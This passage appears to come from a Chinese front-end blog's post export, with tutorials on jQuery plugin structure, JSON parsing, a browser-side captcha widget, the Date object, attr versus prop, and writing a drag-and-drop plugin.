Canvas(settings) &#123; this.settings = settings; this.draw = false; this.canvas = null; this.ctx = null; return this; &#125;下面来添加全局的方法：12345Canvas.prototype = &#123; generate: function() &#123; //generate code &#125; &#125;这里的关键是要让prototype的方法是通用的，但是数据是每个实例自己的，可以用“this”引用。&nbsp;7. 使用 “this” 对象通过使用“$this”，我们可以向别的闭包传递正确的引用。我们也可能需要向别的方法传入 $this 引用。需要注意的是， $this 这个名字是可以改的，任意的变量名都可以。1234567891011121314151617Canvas.prototype = &#123; generate: function() &#123; //some code var $this = this; var buton = //...some code button.click(function()&#123; //using this will not be found since it has it's own this //use $this instead. $this.someFunc($this); &#125;); &#125;, someFunc: function($this) &#123; //won't know what "this" is. //use $this instead passed the click event &#125; &#125;&nbsp;8. 在每一个对象中保存设置&emsp;&emsp;我一直在每一个对象中保存自己的设置，然后操作它自己的设置。这样你就不用在不同的方法中传递很多参数。把这些变量放在对象中，也方便你在其他地方调用这些变量。1234function Canvas(settings) &#123; this.settings = settings; return this; &#125;&nbsp;9. 分离你的Prototype方法逻辑这可能是一个基本的原则。当你在犹豫是否需要提供一个方法的时候，你可以问你自己 “如果其他人要重写这个方法的话，你的代码是否能满足他的需求?”或者“别人来写这个方法有多困难?”。当然这是一个灵活性拿捏的问题。这里列出了我的Color Picker jQuery Plugin 的方法，你可以参考一下：12345678generate() appendColors() colorSelect() colorHoverOn() colorHoverOff() appendToElement() showPalette() hidePalette()&nbsp;10. 提供 Setter/Getter 选项这一条不是必须的，但是我发现我所有的插件都包用到了这一条。因为它只需要一点点代码，就能为别人提供一个他可能需要的功能。基本上，我们只要让开发者能够设置或者获取元素已经存在的值：1var lineWidth = $("#container").wPaint("lineWidth"); $("#container").wPaint("lineWidth", "5");总结：以上十条基本上覆盖了jQuery插件开发的核心，并且可以作为开发的模板。有一套基本的代码可以极大的缩短你的开发时间，并且能够让你设计插件架构的时候更自信。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>jQuery插件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JSON简介以及用法代码汇总]]></title>
    <url>%2F2015%2F08%2F05%2Fjson%E7%AE%80%E4%BB%8B%E4%BB%A5%E5%8F%8A%E7%94%A8%E6%B3%95%E4%BB%A3%E7%A0%81%E6%B1%87%E6%80%BB%2F</url>
    <content type="text"><![CDATA[什么是JSON？JavaScript 对象表示法（JavaScript Object Notation）。JSON是一种轻量级的数据交换格式，某个JSON格式的文件内部譬如可以长成这样：1234&#123; "name": "hanzichi", "sex": "male"&#125;看起来都是key-value的键值对，很像js的对象吧？没错，但同时JSON表示不服，我不能跟js的对象长成一样啊，我得有我自己的个性，于是规定键-值对中的键必须用双引号！同时规定键-值对中的值的取值有一定要求：JSON 值可以是：数字（整数或浮点数）字符串（在双引号中）逻辑值（true 或 false）数组（在方括号中）对象（在花括号中）null除以上6种外，再无其他，没有像js一样的undefined、NAN，JSON拒绝使用。如何使用JSON？JSON一般以字符串的形式在数据交互过程中游走，so对于js而言，如何将json字符串和js对象之间进行相互转换显得尤为重要。&nbsp;eval大法（json字符串 -&gt; js对象）123var jsonStr = '&#123;"name": "hanzichi", "sex": "male"&#125;';var ans = eval('(' + jsonStr + ')');console.log(ans.name, ans.sex); // hanzichi maleeval 函数非常快，但是它可以编译任何 javascirpt 代码，这样的话就可能产生安全的问题。eval 的使用是基于传入的代码参数是可靠的假设下，有一些情况下，可能客户端是不可信任的。如果基于安全的考虑的话，最好是使用一个JSON解析器，一个JSON 解析器将只接受JSON文本，所以是更安全的，如下。&nbsp;JSON.parse（json字符串 -&gt; js对象）123var jsonStr = '&#123;"name": "hanzichi", "sex": "male"&#125;';var obj = JSON.parse(jsonStr);console.log(typeof obj, obj); // object Object &#123;name: "hanzichi", sex: "male"&#125;第二个参数可以是函数，可以对值进行删改：12345678var jsonStr = '&#123;"name": "hanzichi", "sex": "male", "age": 10&#125;';var obj = JSON.parse(jsonStr, function(key, value) &#123; if(key === 'name') &#123; return 'my name is ' + value; &#125; return value;&#125;);console.log(typeof obj, obj); // object Object &#123;name: "my name is hanzichi", sex: "male", age: 10&#125;&nbsp;JSON.stringify（js对象 -&gt; json字符串）123var obj = &#123;name: 'hanzichi', sex: 'male', age: '10'&#125;;var jsonStr = JSON.stringify(obj);console.log(jsonStr); // &#123;"name":"hanzichi","sex":"male","age":"10"&#125;也可以加个参数，规定需要转化为json字符串的属性（数组形式，跟数组同名的js对象属性才会被转换）：123var obj = &#123;name: 'hanzichi', sex: 'male', age: '10'&#125;;var jsonStr = JSON.stringify(obj, ['name']);console.log(jsonStr); // &#123;"name":"hanzichi"&#125;第二个参数也可以是个函数，可以删选符合条件的属性（或者改变属性值，没有return表示放弃该属性，return的值表示该key在json字符串中的值）12345678var obj = &#123;name: 'hanzichi', sex: 'male', age: '10'&#125;;var jsonStr = JSON.stringify(obj, function(key, value) &#123; if(key === 'name') &#123; return 'my name is ' + value; &#125; return value;&#125;);console.log(jsonStr); // &#123;"name":"my name is hanzichi","sex":"male","age":"10"&#125;还可以有第三个参数，可以是数字或者字符串。如果是数字的话，表示缩进，数字大小超过10了按10处理。12345678var obj = &#123;name: 'hanzichi', sex: 'male', age: '10'&#125;;var jsonStr = JSON.stringify(obj, null, 4);console.log(jsonStr); // &#123;// "name": "hanzichi",// "sex": "male",// "age": "10"// &#125;也可以是字符串，会在属性前加上这些字符串充当前缀，同样字符串长度超过10只截取10：12345678var obj = &#123;name: 'hanzichi', sex: 'male', age: '10'&#125;;var jsonStr = JSON.stringify(obj, null, 'pre');console.log(jsonStr); // &#123;// pre"name": "hanzichi",// pre"sex": "male",// pre"age": "10"// &#125;这里我有个疑问，我觉得输出应该是如下形式才对啊…12345&#123;"prename": "hanzichi","presex": "male","preage": "10"&#125;麻烦有知道的大大能倾情告诉我…&nbsp;总结当然传说中的ie8（及以下）因为某种缺陷不能使用JSON.parse()以及JSON.stringify()方法，而eval()又显得不安全，如果要兼容它们的话可以引用json2.js。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>json用法汇总</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript + CSS3写了一个前端验证码插件]]></title>
    <url>%2F2015%2F08%2F05%2Fjavascript-css3%E5%86%99%E4%BA%86%E4%B8%80%E4%B8%AA%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81%E7%A0%81%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[接触的大部分项目中，验证码一直都是后台干的事，这两天正好有一个页面需要验证码，第时间想着后台实现，但突然转念一想大部分项目貌似对安全性要求不是很高，又要求有点阻止机器人的技巧，于是就用前端写了一个验证码。并利用CSS3的transform属性里的rotate设置旋转，再随机弄点干扰线，最后为了在所有DOM节点的上边加一层opacity=0的DIV，一个前端验证码就出来了。Code代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226/** * Created by Lee on 2014/9/16. */(function()&#123; var randstr = function(length)&#123; var key = &#123; str : [ 'a','b','c','d','e','f','g','h','i','j','k','l','m', 'o','p','q','r','s','t','x','u','v','y','z','w','n', '0','1','2','3','4','5','6','7','8','9' ], randint : function(n,m)&#123; var c = m-n+1; var num = Math.random() * c + n; return Math.floor(num); &#125;, randStr : function()&#123; var _this = this; var leng = _this.str.length - 1; var randkey = _this.randint(0, leng); return _this.str[randkey]; &#125;, create : function(len)&#123; var _this = this; var l = len || 10; var str = ''; for(var i = 0 ; i&lt;l ; i++)&#123; str += _this.randStr(); &#125; return str; &#125; &#125;; length = length ? length : 10; return key.create(length); &#125;; var randint = function(n,m)&#123; var c = m-n+1; var num = Math.random() * c + n; return Math.floor(num); &#125;; var vCode = function(dom, options)&#123; this.codeDoms = []; this.lineDoms = []; this.initOptions(options); this.dom = dom; this.init(); this.addEvent(); this.update(); this.mask(); &#125;; vCode.prototype.init = function()&#123; this.dom.style.position = "relative"; this.dom.style.overflow = "hidden"; this.dom.style.cursor = "pointer"; this.dom.title = "点击更换验证码"; this.dom.style.background = this.options.bgColor; this.w = this.dom.clientWidth; this.h = this.dom.clientHeight; this.uW = this.w / this.options.len; &#125;; vCode.prototype.mask = function()&#123; var dom = document.createElement("div"); dom.style.cssText = [ "width: 100%", "height: 100%", "left: 0", "top: 0", "position: absolute", "cursor: pointer", "z-index: 9999999" ].join(";"); dom.title = "点击更换验证码"; this.dom.appendChild(dom); &#125;; vCode.prototype.addEvent = function()&#123; var _this = this; _this.dom.addEventListener("click", function()&#123; _this.update.call(_this); &#125;); &#125;; vCode.prototype.initOptions = function(options)&#123; var f = function()&#123; this.len = 4; this.fontSizeMin = 20; this.fontSizeMax = 48; this.colors = [ "green", "red", "blue", "#53da33", "#AA0000", "#FFBB00" ]; this.bgColor = "#FFF"; this.fonts = [ "Times New Roman", "Georgia", "Serif", "sans-serif", "arial", "tahoma", "Hiragino Sans GB" ]; this.lines = 8; this.lineColors = [ "#888888", "#FF7744", "#888800", "#008888" ]; this.lineHeightMin = 1; this.lineHeightMax = 3; this.lineWidthMin = 1; this.lineWidthMax = 60; &#125;; this.options = new f(); if(typeof options === "object")&#123; for(i in options)&#123; this.options[i] = options[i]; &#125; &#125; &#125;; vCode.prototype.update = function()&#123; for(var i=0; i&lt;this.codeDoms.length; i++)&#123; this.dom.removeChild(this.codeDoms[i]); &#125; for(var i=0; i&lt;this.lineDoms.length; i++)&#123; this.dom.removeChild(this.lineDoms[i]); &#125; this.createCode(); this.draw(); &#125;; vCode.prototype.createCode = function()&#123; this.code = randstr(this.options.len); &#125;; vCode.prototype.verify = function(code)&#123; return this.code === code; &#125;; vCode.prototype.draw = function()&#123; this.codeDoms = []; for(var i=0; i&lt;this.code.length; i++)&#123; this.codeDoms.push(this.drawCode(this.code[i], i)); &#125; this.drawLines(); &#125;; vCode.prototype.drawCode = function(code, index)&#123; var dom = document.createElement("span"); dom.style.cssText = [ "font-size:" + randint(this.options.fontSizeMin, this.options.fontSizeMax) + "px", "color:" + this.options.colors[randint(0, this.options.colors.length - 1)], "position: absolute", "left:" + randint(this.uW * index, this.uW * index + this.uW - 10) + "px", "top:" + randint(0, this.h - 30) + "px", "transform:rotate(" + randint(-30, 30) + "deg)", "-ms-transform:rotate(" + randint(-30, 30) + "deg)", "-moz-transform:rotate(" + randint(-30, 30) + "deg)", "-webkit-transform:rotate(" + randint(-30, 30) + "deg)", "-o-transform:rotate(" + randint(-30, 30) + "deg)", "font-family:" + this.options.fonts[randint(0, this.options.fonts.length - 1)], "font-weight:" + randint(400, 900) ].join(";"); dom.innerHTML = code; this.dom.appendChild(dom); return dom; &#125;; vCode.prototype.drawLines = function()&#123; this.lineDoms = []; for(var i=0; i&lt;this.options.lines; i++)&#123; var dom = document.createElement("div"); dom.style.cssText = [ "position: absolute", "opacity: " + randint(3, 8) / 10, "width:" + randint(this.options.lineWidthMin, this.options.lineWidthMax) + "px", "height:" + randint(this.options.lineHeightMin, this.options.lineHeightMax) + "px", "background: " + this.options.lineColors[randint(0, this.options.lineColors.length - 1)], "left:" + randint(0, this.w - 20) + "px", "top:" + randint(0, this.h) + "px", "transform:rotate(" + randint(-30, 30) + "deg)", "-ms-transform:rotate(" + randint(-30, 30) + "deg)", "-moz-transform:rotate(" + randint(-30, 30) + "deg)", "-webkit-transform:rotate(" + randint(-30, 30) + "deg)", "-o-transform:rotate(" + randint(-30, 30) + "deg)", "font-family:" + this.options.fonts[randint(0, this.options.fonts.length - 1)], "font-weight:" + randint(400, 900) ].join(";"); this.dom.appendChild(dom); this.lineDoms.push(dom); &#125; &#125;; this.vCode = vCode;&#125;).call(this);用法：123456//container 为 验证码的DOM节点var code = new vCode(container);// 验证是否正确// inputCode为用户输入的验证码code.verify(inputCode); // return true or false&nbsp;查看演示点击下载]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>前端验证码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js Date对象详解]]></title>
    <url>%2F2015%2F08%2F05%2Fjs-date%E5%AF%B9%E8%B1%A1%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[Date在js中和Array类似，都是拥有自己的特殊方法的特殊对象。由于平常用到Date着实不多，对它的了解颇浅。上周被问到怎么样获取某年某个月的天数，我当时想了一会儿，回答说有两种，一种自己写判断闰年的逻辑，每个月天数分两种情况存数组，一种是利用js Date对象的特性(其实是他总结的…)。不过具体用到什么特性我答不上来。现在既然想起来了，也学习总结一下好了。1.Date get和set系列(注：getTime()具体的参照时间为1970年1月1日8点0分0秒)所有的set对应都有get系列，详情参照 http://www.w3school.com.cn/jsref/jsref_obj_date.asp。值得注意的是所有的get和set都必须初始化一个实例并以实例的属性方式调用。如:其实也很容易理解，毕竟要设置或者返回Date对象的值，肯定这个值得先存在啊。标准点的写法是var date=new Date(2015,7,30);date.getDate()如果new Date()里面没有传任何参数，也没有用任何set系列方法，那么就指的是当前的值(本地计算时钟)，包括时分秒。js中可以很容易用这个特征来以任何形式显示当前时间。12345678910var date = new Date(), nowYear = date.getFullYear(), nowMonth = date.getMonth() + 1, //注意getMonth从0开始，getDay()也是(此时0代表星期日) nowDay = date.getDate(), nowHour = date.getHours(), nowMinute = date.getMinutes(), nowSecond = date.getSeconds(), weekday = ["星期日", "星期一", "星期二", "星期三", "星期四", "星期五", "星期六"], nowWeek = weekday[date.getDay()];console.log(nowYear + '年' + nowMonth + '月' + nowDay + '日' + nowHour + '时' + nowMinute + '分' + nowSecond + '秒' + nowWeek);同样，利用内置的 setInterval 或者 setTimeout 回调自身的方法，可以很容易的做时钟效果。见w3cSchool http://www.w3school.com.cn/tiy/t.asp?f=jsrf_date_timing_clock。&nbsp;2.其它方法首先是每个对象都有的valueOf()(得到真实值)和toString()(得到字符串形式表示值)。注意红色框内的不同。然后是toTimeString() ：将Date对象时间部分转化为字符串并返回，因此必须有时间参数，必须有实例，toDateString() ：将Date对象的日期部分转化为字符串并返回，必须有实例。最后是parse() : 返回1970年1月1日8点整到指定日期（字符串）的毫秒数，精确到秒。只能用Date.parse(Date实例)的形式调用。 (注意比较getTime(),精确到毫秒。)toSource() : 返回源代码。注:toLocaleString：根据本地时间格式，将Date对象转化为字符串，与UTC，GMT对应，在Array和在Date中这个方法都已经过时，就不再纠结。UTC系列用得很少，也就是格式有所不同，详情参见http://www.w3school.com.cn/jsref/jsref_obj_date.asp。&nbsp;3.重要知识点小结(1)set系列的参数讨论setFullYear()前三个参数有用，时分秒还是本地的~~~&nbsp;其它set系列都只有第一个参数有用，返回值分别为在new Date()(当前时间)的基础上加上了Month/Date/Minutes * 对应的第一个参数。&nbsp;(2)设置完整时间很明显setTime也是set系列，故而只是在原来的基础上增加了1992毫秒(显示为1s)。由于setTime比较特殊，是以1970年1月1日早上8点( FF、Chrome、IE5+、Opera (safari用得少就没测) 中测试，虽然w3School中说是0点,但是测试一下new Date(1970,0,1,8,0,0).getTime()显示为0就很明显了 )为基准开始算的，因此在实际执行前其实date实例已经不是new Date()所对应的当前时间了，而是有一个被转化为基准时间的过程。所以显示的为1970,0,1,8,0,1。如果将1992改为5000则为1970,0,1,8,0,5。而设置完整时间的方法，为new Date对象的时候传入需要设置的时间的参数。可以为1992,10,3,10,2,50 (还可以加上毫秒级，然后用getTime()检测出来，但是一般用不上) 的数字形式 (表示1992年11月3日10时2分50秒)，也可以为标准字符串格式(但一般不会这么写吧~~~)。&nbsp;(3)getDate()一般放在后面就是用来压轴用的，嘿嘿。作为get系列，除了参数的个数有些讲究之外，参数的取值也是很有讲究的。首先回答最初的问题，得到某年某个月的最大天数(可以理解为判断闰年~)。1new Date(2014,2,0).getDate(); //返回2014年2月份的最后一天(28)当第三个参数为0的时候，其实是返回上一个月的最后一天 (注意月份的数字2实际上是三月份，故而代码是返回2月份的最后一天在当月中的序号)。看更多例子12345678910new Date(2014,1,30).getDate(); //返回2014年3月2日在3月份中的天数(2)new Date(2014,2,-1).getDate(); //返回2014年2月份的倒数第二天(27)//当参数缺少的时候显示1new Date(2014,8).getDate(); new Date(14,18).getDate(); new Date(180).getDate();//当参数多余的时候多余的不起作用(并没有设置对arguments[3+]的操作)new Date(2015,2,0,2).getDate();天数多了会自动往下月计算，天数为负数则往上个月计算。参数少了有问题，多了的话多的部分没作用。对比其它的set系列其实也差不多就是这么个实现的思路，看(2)就知道了。&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js date</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jquery中attr和prop的区别]]></title>
    <url>%2F2015%2F08%2F05%2Fjquery%E4%B8%ADattr%E5%92%8Cprop%E7%9A%84%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"><![CDATA[在高版本的jquery引入prop方法后，什么时候该用prop？什么时候用attr？它们两个之间有什么区别？这些问题就出现了。关于它们两个的区别，网上的答案很多。这里谈谈我的心得，我的心得很简单：对于HTML元素本身就带有的固有属性，在处理时，使用prop方法。对于HTML元素我们自己自定义的DOM属性，在处理时，使用attr方法。上面的描述也许有点模糊，举几个例子就知道了。&lt;a href=&quot;http://www.baidu.com&quot; target=&quot;_self&quot; class=&quot;btn&quot;&gt;百度&lt;/a&gt;这个例子里&lt;a&gt;元素的DOM属性有“href、target和class”，这些属性就是&lt;a&gt;元素本身就带有的属性，也是W3C标准里就包含有这几个属性，或者说在IDE里能够智能提示出的属性，这些就叫做固有属性。处理这些属性时，建议使用prop方法。&lt;a href=&quot;#&quot; id=&quot;link1&quot; action=&quot;delete&quot;&gt;删除&lt;/a&gt;这个例子里&lt;a&gt;元素的DOM属性有“href、id和action”，很明显，前两个是固有属性，而后面一个“action”属性是我们自己自定义上去的，&lt;a&gt;元素本身是没有这个属性的。这种就是自定义的DOM属性。处理这些属性时，建议使用attr方法。使用prop方法取值和设置属性值时，都会返回undefined值。再举一个例子：12&lt;input id="chk1" type="checkbox" /&gt;是否可见&lt;input id="chk2" type="checkbox" checked="checked" /&gt;是否可见像checkbox，radio和select这样的元素，选中属性对应“checked”和“selected”，这些也属于固有属性，因此需要使用prop方法去操作才能获得正确的结果。12$("#chk1").prop("checked") == false$("#chk2").prop("checked") == true如果上面使用attr方法，则会出现：12$("#chk1").attr("checked") == undefined$("#chk2").attr("checked") == "checked"]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>attr和prop的区别</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手把手教你实现JS拖拽插件]]></title>
    <url>%2F2015%2F08%2F05%2F%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E4%BD%A0%E5%AE%9E%E7%8E%B0js%E6%8B%96%E6%8B%BD%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[一、js拖拽插件的原理常见的拖拽操作是什么样的呢？整过过程大概有下面几个步骤：1、用鼠标点击被拖拽的元素2、按住鼠标不放，移动鼠标3、拖拽元素到一定位置，放开鼠标这里的过程涉及到三个dom事件：onmousedown,onmousemove,onmouseup。所以拖拽的基本思路就是：1、用鼠标点击被拖拽的元素触发onmousedown（1）设置当前元素的可拖拽为true，表示可以拖拽（2）记录当前鼠标的坐标x,y（3）记录当前元素的坐标x,y2、移动鼠标触发onmousemove（1）判断元素是否可拖拽，如果是则进入步骤2，否则直接返回（2）如果元素可拖拽，则设置元素的坐标元素的x坐标 = 鼠标移动的横向距离+元素本来的x坐标 = 鼠标现在的x坐标 - 鼠标之前的x坐标 + 元素本来的x坐标元素的y坐标 = 鼠标移动的横向距离+元素本来的y坐标 = 鼠标现在的y坐标 - 鼠标之前的y坐标 + 元素本来的y坐标3、放开鼠标触发onmouseup（1）将鼠标的可拖拽状态设置成false二、根据原理实现的最基本效果在实现基本的效果之前，有几点需要说明的：1、元素想要被拖动，它的postion属性一定要是relative或absolute2、通过event.clientX和event.clientY获取鼠标的坐标3、onmousemove是绑定在document元素上而不是拖拽元素本身，这样能解决快速拖动造成的延迟或停止移动的问题代码如下：1234567891011121314151617181920212223242526272829303132var dragObj = document.getElementById("test"); dragObj.style.left = "0px"; dragObj.style.top = "0px"; var mouseX, mouseY, objX, objY; var dragging = false; dragObj.onmousedown = function (event) &#123; event = event || window.event; dragging = true; dragObj.style.position = "relative"; mouseX = event.clientX; mouseY = event.clientY; objX = parseInt(dragObj.style.left); objY = parseInt(dragObj.style.top); &#125; document.onmousemove = function (event) &#123; event = event || window.event; if (dragging) &#123; dragObj.style.left = parseInt(event.clientX - mouseX + objX) + "px"; dragObj.style.top = parseInt(event.clientY - mouseY + objY) + "px"; &#125; &#125; document.onmouseup = function () &#123; dragging = false; &#125;三、代码抽象与优化上面的代码要做成插件，要将其抽象出来，基本结构如下：123456; (function (window, undefined) &#123; function Drag(ele) &#123;&#125; window.Drag = Drag; &#125;)(window, undefined);&emsp;&emsp;用自执行匿名函数将代码包起来，内部定义Drag方法并暴露到全局中，直接调用Drag，传入被拖拽的元素。首先对一些常用的方法进行简单的封装：1234567891011121314151617181920212223242526272829303132; (function (window, undefined) &#123; var dom = &#123; //绑定事件 on: function (node, eventName, handler) &#123; if (node.addEventListener) &#123; node.addEventListener(eventName, handler); &#125; else &#123; node.attachEvent("on" + eventName, handler); &#125; &#125;, //获取元素的样式 getStyle: function (node, styleName) &#123; var realStyle = null; if (window.getComputedStyle) &#123; realStyle = window.getComputedStyle(node, null)[styleName]; &#125; else if (node.currentStyle) &#123; realStyle = node.currentStyle[styleName]; &#125; return realStyle; &#125;, //获取设置元素的样式 setCss: function (node, css) &#123; for (var key in css) &#123; node.style[key] = css[key]; &#125; &#125; &#125;; window.Drag = Drag; &#125;)(window, undefined);&emsp;&emsp;在一个拖拽操作中，存在着两个对象：被拖拽的对象和鼠标对象，我们定义了下面的两个对象以及它们对应的操作：首先的拖拽对象，它包含一个元素节点和拖拽之前的坐标x和y：1234567891011121314151617181920212223242526function DragElement(node) &#123; this.node = node;//被拖拽的元素节点 this.x = 0;//拖拽之前的x坐标 this.y = 0;//拖拽之前的y坐标 &#125; DragElement.prototype = &#123; constructor: DragElement, init: function () &#123; this.setEleCss(&#123; "left": dom.getStyle(node, "left"), "top": dom.getStyle(node, "top") &#125;) .setXY(node.style.left, node.style.top); &#125;, //设置当前的坐标 setXY: function (x, y) &#123; this.x = parseInt(x) || 0; this.y = parseInt(y) || 0; return this; &#125;, //设置元素节点的样式 setEleCss: function (css) &#123; dom.setCss(this.node, css); return this; &#125; &#125;还有一个对象是鼠标，它主要包含x坐标和y坐标：12345678function Mouse() &#123; this.x = 0; this.y = 0; &#125; Mouse.prototype.setXY = function (x, y) &#123; this.x = parseInt(x); this.y = parseInt(y); &#125;这是在拖拽操作中定义的两个对象。如果一个页面可以有多个拖拽元素，那应该注意什么：1、每个元素对应一个拖拽对象实例2、每个页面只能有一个正在拖拽中的元素为此，我们定义了唯一一个对象用来保存相关的配置：12345var draggableConfig = &#123; zIndex: 1, draggingObj: null, mouse: new Mouse() &#125;;这个对象中有三个属性：（1）zIndex：用来赋值给拖拽对象的zIndex属性，有多个拖拽对象时，当两个拖拽对象重叠时，会造成当前拖拽对象有可能被挡住，通过设置zIndex使其显示在最顶层（2）draggingObj：用来保存正在拖拽的对象，在这里去掉了前面的用来判断是否可拖拽的变量，通过draggingObj来判断当前是否可以拖拽以及获取相应的拖拽对象（3）mouse：唯一的鼠标对象，用来保存当前鼠标的坐标等信息最后是绑定onmousedown，onmouseover，onmouseout事件，整合上面的代码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116; (function (window, undefined) &#123; var dom = &#123; //绑定事件 on: function (node, eventName, handler) &#123; if (node.addEventListener) &#123; node.addEventListener(eventName, handler); &#125; else &#123; node.attachEvent("on" + eventName, handler); &#125; &#125;, //获取元素的样式 getStyle: function (node, styleName) &#123; var realStyle = null; if (window.getComputedStyle) &#123; realStyle = window.getComputedStyle(node, null)[styleName]; &#125; else if (node.currentStyle) &#123; realStyle = node.currentStyle[styleName]; &#125; return realStyle; &#125;, //获取设置元素的样式 setCss: function (node, css) &#123; for (var key in css) &#123; node.style[key] = css[key]; &#125; &#125; &#125;; //#region 拖拽元素类 function DragElement(node) &#123; this.node = node; this.x = 0; this.y = 0; &#125; DragElement.prototype = &#123; constructor: DragElement, init: function () &#123; this.setEleCss(&#123; "left": dom.getStyle(node, "left"), "top": dom.getStyle(node, "top") &#125;) .setXY(node.style.left, node.style.top); &#125;, setXY: function (x, y) &#123; this.x = parseInt(x) || 0; this.y = parseInt(y) || 0; return this; &#125;, setEleCss: function (css) &#123; dom.setCss(this.node, css); return this; &#125; &#125; //#endregion //#region 鼠标元素 function Mouse() &#123; this.x = 0; this.y = 0; &#125; Mouse.prototype.setXY = function (x, y) &#123; this.x = parseInt(x); this.y = parseInt(y); &#125; //#endregion //拖拽配置 var draggableConfig = &#123; zIndex: 1, draggingObj: null, mouse: new Mouse() &#125;; function Drag(ele) &#123; this.ele = ele; function mouseDown(event) &#123; var ele = event.target || event.srcElement; draggableConfig.mouse.setXY(event.clientX, event.clientY); draggableConfig.draggingObj = new DragElement(ele); draggableConfig.draggingObj .setXY(ele.style.left, ele.style.top) .setEleCss(&#123; "zIndex": draggableConfig.zIndex++, "position": "relative" &#125;); &#125; ele.onselectstart = function () &#123; //防止拖拽对象内的文字被选中 return false; &#125; dom.on(ele, "mousedown", mouseDown); &#125; dom.on(document, "mousemove", function (event) &#123; if (draggableConfig.draggingObj) &#123; var mouse = draggableConfig.mouse, draggingObj = draggableConfig.draggingObj; draggingObj.setEleCss(&#123; "left": parseInt(event.clientX - mouse.x + draggingObj.x) + "px", "top": parseInt(event.clientY - mouse.y + draggingObj.y) + "px" &#125;); &#125; &#125;) dom.on(document, "mouseup", function (event) &#123; draggableConfig.draggingObj = null; &#125;) window.Drag = Drag; &#125;)(window, undefined);调用方法：Drag(document.getElementById(“obj”));&emsp;&emsp;注意的一点，为了防止选中拖拽元素中的文字，通过onselectstart事件处理程序return false来处理这个问题。四、扩展：有效的拖拽元素我们常见的一些拖拽效果很有可能是这样的：弹框的顶部是可以进行拖拽操作的，内容区域是不可拖拽的，怎么实现这样的效果呢：&emsp;&emsp;首先优化拖拽元素对象如下，增加一个目标元素target，表示被拖拽对象，在上图的登录框中，就是整个登录窗口。&emsp;&emsp;被记录和设置坐标的拖拽元素就是这个目标元素，但是它并不是整个部分都是拖拽的有效部分。我们在html结构中为拖拽的有效区域添加类draggable表示有效拖拽区域：12345678&lt;div id="obj1" class="dialog" style="position:relative;left:50px"&gt; &lt;div class="header draggable"&gt; 拖拽的有效元素 &lt;/div&gt; &lt;div class="content"&gt; 拖拽对象1 &lt;/div&gt; &lt;/div&gt;然后修改Drag方法如下：123456789101112131415161718function drag(ele) &#123; var dragNode = (ele.querySelector(".draggable") || ele); dom.on(dragNode, "mousedown", function (event) &#123; var dragElement = draggableConfig.dragElement = new DragElement(ele); draggableConfig.mouse.setXY(event.clientX, event.clientY); draggableConfig.dragElement .setXY(dragElement.target.style.left, dragElement.target.style.top) .setTargetCss(&#123; "zIndex": draggableConfig.zIndex++, "position": "relative" &#125;); &#125;).on(dragNode, "mouseover", function () &#123; dom.setCss(this, draggableStyle.dragging); &#125;).on(dragNode, "mouseout", function () &#123; dom.setCss(this, draggableStyle.defaults); &#125;); &#125;&emsp;&emsp;主要修改的是绑定mousedown的节点变成了包含draggable类的有效元素，如果不含有draggable，则整个元素都是有效元素。五、性能优化和总结&emsp;&emsp;由于onmousemove在一直调用，会造成一些性能问题，我们可以通过setTimout来延迟绑定onmousemove事件，改进move函数如下123456789101112131415function move(event) &#123; if (draggableConfig.dragElement) &#123; var mouse = draggableConfig.mouse, dragElement = draggableConfig.dragElement; dragElement.setTargetCss(&#123; "left": parseInt(event.clientX - mouse.x + dragElement.x) + "px", "top": parseInt(event.clientY - mouse.y + dragElement.y) + "px" &#125;); dom.off(document, "mousemove", move); setTimeout(function () &#123; dom.on(document, "mousemove", move); &#125;, 25); &#125; &#125;总结：整个拖拽插件的实现其实很简单，主要是要注意几点1、实现思路：元素拖拽位置的改变就等于鼠标改变的距离，关键在于获取鼠标的变动和元素原本的坐标2、通过setTimeout来延迟加载onmousemove事件来提供性能六、jquery插件化简单地将其封装成jquery插件，主要是相关的dom方法替换成jquery方法来操作123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107; (function ($, window, undefined) &#123; //#region 拖拽元素类 function DragElement(node) &#123; this.target = node; node.onselectstart = function () &#123; //防止拖拽对象内的文字被选中 return false; &#125; &#125; DragElement.prototype = &#123; constructor: DragElement, setXY: function (x, y) &#123; this.x = parseInt(x) || 0; this.y = parseInt(y) || 0; return this; &#125;, setTargetCss: function (css) &#123; $(this.target).css(css); return this; &#125; &#125; //#endregion //#region 鼠标元素 function Mouse() &#123; this.x = 0; this.y = 0; &#125; Mouse.prototype.setXY = function (x, y) &#123; this.x = parseInt(x); this.y = parseInt(y); &#125; //#endregion //拖拽配置 var draggableConfig = &#123; zIndex: 1, dragElement: null, mouse: new Mouse() &#125;; var draggableStyle = &#123; dragging: &#123; cursor: "move" &#125;, defaults: &#123; cursor: "default" &#125; &#125; var $document = $(document); function drag($ele) &#123; var $dragNode = $ele.find(".draggable"); $dragNode = $dragNode.length &gt; 0 ? $dragNode : $ele; 